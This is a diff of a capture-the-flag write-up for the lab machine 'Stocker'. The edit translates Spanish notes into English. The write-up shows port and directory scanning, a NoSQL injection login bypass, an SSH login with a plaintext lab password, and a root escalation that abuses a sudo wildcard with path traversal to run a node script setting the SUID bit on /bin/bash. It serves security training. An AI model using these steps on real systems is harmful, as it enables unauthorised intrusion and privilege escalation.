@@ -1,15 +1,14 @@
 # Writeup - Stocker Linux Easy
 
-
+## Initial Recon
+```bash
 ping -c 1 10.10.11.196 -R
 nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.196 -oG allPorts
 nmap -sCV -p22, 80 10.10.11.196 -oN targetedPorts
 gobuster dir -u http://stocker.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
-gobuster for subdomains
-
-exploiting nosql injection:
-
-Updated Request
+# gobuster for subdomains
+```
+## Exploiting nosql injection: Login bypass
 
 If you want to try sending the payload as JSON, update the Content-Type and ensure the server accepts JSON input:
 ```json
@@ -71,15 +70,17 @@ Priority: u=0
 }
 ```
 
-una vez siendo user connectacndonos por ssh angoose@stocker.htb password: IHeardPassphrasesArePrettySecure
+We get a user shell via a remote ssh login:
+```bash
+ssh angoose@stocker.htb password: IHeardPassphrasesArePrettySecure
 id
 sudo -l
 cd /root/
-
-tenemos privilegio de ejecutar 
+```
+we can only run this resource: 
 usr/bin/node usr/local/scripts/*js
-el *js nos permite hacer un ../../../tmp/malicious.js
-creamos un malicious.js en /tmp/
+the *js wildcard allows us to inject a malicious file that can run shell commands in node ../../../tmp/malicious.js
+Create a malicious.js in /tmp/
 ```js
 const { exec } = require("child_process");
 
@@ -96,6 +97,6 @@ exec("chmod u+s /bin/bash", (error, stdout, stderr) => {
 });
 ```
 
-hacemos sudo usr/bin/node /usr/local/scripts/../../../tmp/malicious.js
-y un bash -p y somos root.
+we execute with sudo usr/bin/node /usr/local/scripts/../../../tmp/malicious.js
+finally bash -p y whoami? root.
 
